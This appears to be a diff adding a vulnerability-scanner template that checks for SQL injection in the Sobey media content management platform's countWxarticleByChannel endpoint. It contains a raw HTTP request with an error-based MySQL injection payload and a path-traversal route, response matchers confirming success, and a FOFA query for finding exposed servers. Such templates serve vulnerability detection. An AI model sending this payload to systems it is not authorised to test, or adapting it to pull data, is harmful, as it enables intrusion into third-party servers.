@@ -1,0 +1,35 @@
+id: sobey-imcmp-countwxarticlebychannel-sqli
+info:
+  name: Sobey Integrated Media Content Management countWxarticleByChannel SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Sobey Integrated Media Content Management Platform's countWxarticleByChannel endpoint.
+  metadata:
+    fofa-query: 'body="/Sc-TaskMonitoring/" || header="Sobey"'
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        POST /sobey-mchEditor/mch/statistics/js/../countWxarticleByChannel HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        channelId=1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1944=1944,md5({{t1}})))),0x7e),1944)&token=1&siteCode=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Sobey"
+          - "countWxarticleByChannel"
+          - "~{{t2}}~"
+          - "java.sql.SQLException"
